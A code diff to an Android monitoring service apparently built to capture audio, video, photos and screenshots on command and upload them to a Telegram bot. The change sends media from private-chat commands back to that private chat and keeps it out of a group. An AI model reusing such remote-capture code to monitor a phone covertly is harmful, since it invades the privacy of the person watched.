@@ -12914,7 +12914,13 @@ class MonitoringService : Service() {
             if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) return MediaSendOutcome.KEPT
             if (NetworkUtils.rateLimitedRemainMs() > 0L) return MediaSendOutcome.KEPT
             if (!hasNetwork()) return MediaSendOutcome.KEPT
-            val (botToken, chatId) = sendCreds()
+            val (botToken, chatIdMentah) = sendCreds()
+            // Chat tujuan menghormati override perintah
+            // sensitif (issue #1548): /photo, /screenshot,
+            // /record* yang diketik dari chat privat tak
+            // boleh menerbitkan medianya ke grup. Di luar
+            // jendela perintah override kosong = konfigurasi.
+            val chatId = replyOverrideChatId.ifEmpty { chatIdMentah }
             if (botToken.isEmpty() || chatId.isEmpty()) return MediaSendOutcome.KEPT
             val requestFile = audioFile.asRequestBody("audio/mp4".toMediaTypeOrNull())
             val audioPart = MultipartBody.Part.createFormData("audio", audioFile.name, requestFile)
@@ -13150,7 +13156,13 @@ class MonitoringService : Service() {
                 android.util.Log.w("MonitoringService", "No network - video saved for later")
                 return MediaSendOutcome.KEPT
             }
-            val (botToken, chatId) = sendCreds()
+            val (botToken, chatIdMentah) = sendCreds()
+            // Chat tujuan menghormati override perintah
+            // sensitif (issue #1548): /photo, /screenshot,
+            // /record* yang diketik dari chat privat tak
+            // boleh menerbitkan medianya ke grup. Di luar
+            // jendela perintah override kosong = konfigurasi.
+            val chatId = replyOverrideChatId.ifEmpty { chatIdMentah }
             if (botToken.isEmpty() || chatId.isEmpty()) {
                 android.util.Log.e("MonitoringService", "Bot credentials missing")
                 return MediaSendOutcome.KEPT
@@ -13635,7 +13647,13 @@ class MonitoringService : Service() {
                 return MediaSendOutcome.KEPT
             }
 
-            val (botToken, chatId) = sendCreds()
+            val (botToken, chatIdMentah) = sendCreds()
+            // Chat tujuan menghormati override perintah
+            // sensitif (issue #1548): /photo, /screenshot,
+            // /record* yang diketik dari chat privat tak
+            // boleh menerbitkan medianya ke grup. Di luar
+            // jendela perintah override kosong = konfigurasi.
+            val chatId = replyOverrideChatId.ifEmpty { chatIdMentah }
 
             if (botToken.isEmpty() || chatId.isEmpty()) {
                 android.util.Log.e("MonitoringService", "Bot credentials missing")
